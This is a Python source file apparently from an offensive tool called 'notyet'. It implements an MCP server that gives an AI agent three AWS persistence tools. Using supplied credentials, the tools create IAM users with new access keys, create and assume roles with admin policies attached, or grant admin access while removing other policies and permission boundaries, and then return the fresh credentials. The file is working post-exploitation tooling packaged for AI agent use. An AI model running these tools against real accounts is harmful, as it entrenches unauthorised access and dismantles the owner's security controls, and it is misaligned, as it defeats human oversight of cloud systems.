"""
MCP Server Mode for notyet.

This module implements the Model Context Protocol (MCP) server that exposes
persistence techniques as callable tools. The MCP server provides a programmatic
interface to the persistence techniques without continuous monitoring.
"""

import logging
from typing import Any, Dict, Optional

from mcp.server import Server
from mcp.server.stdio import stdio_server

from .aws_clients import IAMClient, STSClient
from .credential_manager import CredentialManager
from .access_key_persistence import AccessKeyPersistence
from .role_persistence import RolePersistence
from .policy_manager import PolicyManager
from .models import Credentials, CallerIdentity


logger = logging.getLogger(__name__)


class MCPServer:
    """
    MCP server that exposes persistence techniques as callable tools.
    
    This server provides three tools:
    1. establish_persistent_keys_persistence: Implements Scenario A (Access Key Persistence)
    2. establish_temporary_role_persistence: Implements Scenario B (Role Persistence)
    3. apply_common_techniques: Implements Scenario C (Policy Management)
    
    Each tool is a one-shot operation that returns structured output with
    success status and created resource information.
    
    **Validates: Requirements 11.1, 11.2, 11.3, 11.4, 11.5, 11.6**
    """
    
    def __init__(self):
        """Initialize the MCP server."""
        self.server = Server("notyet")
        self._register_tools()
        logger.info("MCP server initialized")
    
    def _register_tools(self) -> None:
        """Register all MCP tools."""
        
        @self.server.list_tools()
        async def list_tools():
            """List available tools."""
            return [
                {
                    "name": "establish_persistent_keys_persistence",
                    "description": "Implements access key persistence (Scenario A). Creates a temporary role, assumes it, creates a new IAM user with access keys, and returns new persistent credentials.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "access_key_id": {
                                "type": "string",
                                "description": "AWS access key ID"
                            },
                            "secret_access_key": {
                                "type": "string",
                                "description": "AWS secret access key"
                            },
                            "session_token": {
                                "type": "string",
                                "description": "AWS session token (optional)"
                            }
                        },
                        "required": ["access_key_id", "secret_access_key"]
                    }
                },
                {
                    "name": "establish_temporary_role_persistence",
                    "description": "Implements role persistence (Scenario B). Creates a new role with trust policy, attaches admin policy, assumes the role, and returns new temporary credentials.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "access_key_id": {
                                "type": "string",
                                "description": "AWS access key ID"
                            },
                            "secret_access_key": {
                                "type": "string",
                                "description": "AWS secret access key"
                            },
                            "session_token": {
                                "type": "string",
                                "description": "AWS session token (required for temporary credentials)"
                            }
                        },
                        "required": ["access_key_id", "secret_access_key", "session_token"]
                    }
                },
                {
                    "name": "apply_common_techniques",
                    "description": "Implements policy management (Scenario C). Attaches notyet policy with admin access and removes all other policies, session policies, and permission boundaries.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "access_key_id": {
                                "type": "string",
                                "description": "AWS access key ID"
                            },
                            "secret_access_key": {
                                "type": "string",
                                "description": "AWS secret access key"
                            },
                            "session_token": {
                                "type": "string",
                                "description": "AWS session token (optional)"
                            }
                        },
                        "required": ["access_key_id", "secret_access_key"]
                    }
                }
            ]
        
        @self.server.call_tool()
        async def call_tool(name: str, arguments: Dict[str, Any]):
            """Handle tool calls."""
            if name == "establish_persistent_keys_persistence":
                return await self._establish_persistent_keys_persistence(arguments)
            elif name == "establish_temporary_role_persistence":
                return await self._establish_temporary_role_persistence(arguments)
            elif name == "apply_common_techniques":
                return await self._apply_common_techniques(arguments)
            else:
                raise ValueError(f"Unknown tool: {name}")
    
    async def _establish_persistent_keys_persistence(
        self,
        arguments: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Implement Scenario A: Access Key Persistence.
        
        Args:
            arguments: Dictionary containing access_key_id, secret_access_key, 
                      and optional session_token
        
        Returns:
            Dictionary with success status, new credentials, and created resources
        
        **Validates: Requirements 11.2, 11.5, 11.6**
        """
        logger.info("MCP tool called: establish_persistent_keys_persistence")
        
        try:
            # Load and validate credentials
            credentials = Credentials(
                access_key_id=arguments["access_key_id"],
                secret_access_key=arguments["secret_access_key"],
                session_token=arguments.get("session_token")
            )
            
            # Validate credentials and get identity
            cred_manager = CredentialManager()
            cred_manager.validate_credentials(credentials)
            identity = cred_manager.get_identity(credentials)
            
            # Execute access key persistence scenario
            iam_client = IAMClient(credentials)
            access_key_persistence = AccessKeyPersistence(iam_client, logger)
            new_credentials = access_key_persistence.execute(credentials, identity.account)
            
            # Return structured output
            return {
                "success": True,
                "new_credentials": {
                    "access_key_id": new_credentials.access_key_id,
                    "secret_access_key": new_credentials.secret_access_key,
                    "session_token": new_credentials.session_token,
                    "is_temporary": new_credentials.is_temporary
                },
                "created_resources": {
                    "users": list(access_key_persistence.created_users),
                    "message": "Access key persistence established successfully"
                }
            }
        
        except Exception as e:
            logger.error(f"Error in establish_persistent_keys_persistence: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__
            }
    
    async def _establish_temporary_role_persistence(
        self,
        arguments: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Implement Scenario B: Role Persistence.
        
        Args:
            arguments: Dictionary containing access_key_id, secret_access_key, 
                      and session_token
        
        Returns:
            Dictionary with success status, new credentials, and created resources
        
        **Validates: Requirements 11.3, 11.5, 11.6**
        """
        logger.info("MCP tool called: establish_temporary_role_persistence")
        
        try:
            # Load and validate credentials
            credentials = Credentials(
                access_key_id=arguments["access_key_id"],
                secret_access_key=arguments["secret_access_key"],
                session_token=arguments["session_token"]
            )
            
            # Validate credentials and get identity
            cred_manager = CredentialManager()
            cred_manager.validate_credentials(credentials)
            identity = cred_manager.get_identity(credentials)
            
            # Execute role persistence scenario
            iam_client = IAMClient(credentials)
            role_persistence = RolePersistence(iam_client, logger)
            new_credentials = role_persistence.execute(credentials, identity.account)
            
            # Return structured output
            return {
                "success": True,
                "new_credentials": {
                    "access_key_id": new_credentials.access_key_id,
                    "secret_access_key": new_credentials.secret_access_key,
                    "session_token": new_credentials.session_token,
                    "is_temporary": new_credentials.is_temporary,
                    "expiration": new_credentials.expiration.isoformat() if new_credentials.expiration else None
                },
                "created_resources": {
                    "roles": list(role_persistence.created_roles),
                    "message": "Role persistence established successfully"
                }
            }
        
        except Exception as e:
            logger.error(f"Error in establish_temporary_role_persistence: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__
            }
    
    async def _apply_common_techniques(
        self,
        arguments: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Implement Scenario C: Policy Management.
        
        Args:
            arguments: Dictionary containing access_key_id, secret_access_key, 
                      and optional session_token
        
        Returns:
            Dictionary with success status, policy name, and removed policies
        
        **Validates: Requirements 11.4, 11.5, 11.6**
        """
        logger.info("MCP tool called: apply_common_techniques")
        
        try:
            # Load and validate credentials
            credentials = Credentials(
                access_key_id=arguments["access_key_id"],
                secret_access_key=arguments["secret_access_key"],
                session_token=arguments.get("session_token")
            )
            
            # Validate credentials and get identity
            cred_manager = CredentialManager()
            cred_manager.validate_credentials(credentials)
            identity = cred_manager.get_identity(credentials)
            
            # Execute policy management scenario
            iam_client = IAMClient(credentials)
            policy_manager = PolicyManager(iam_client, logger)
            policy_name = policy_manager.establish_policy(identity)
            
            # Return structured output
            return {
                "success": True,
                "policy_name": policy_name,
                "identity": {
                    "type": identity.identity_type,
                    "name": identity.identity_name,
                    "account": identity.account
                },
                "message": "Common persistence techniques applied successfully"
            }
        
        except Exception as e:
            logger.error(f"Error in apply_common_techniques: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__
            }
    
    async def run(self) -> None:
        """
        Start the MCP server and block until stopped.
        
        This method starts the MCP server using stdio transport and blocks
        until the server is stopped. It should only be called when the
        --mcp-server flag is provided.
        
        **Validates: Requirements 11.1**
        """
        logger.info("Starting MCP server...")
        
        try:
            # Run the server using stdio transport
            async with stdio_server(self.server) as (read_stream, write_stream):
                await self.server.run(
                    read_stream,
                    write_stream,
                    self.server.create_initialization_options()
                )
        except KeyboardInterrupt:
            logger.info("MCP server stopped by user")
        except Exception as e:
            logger.error(f"MCP server error: {str(e)}")
            raise
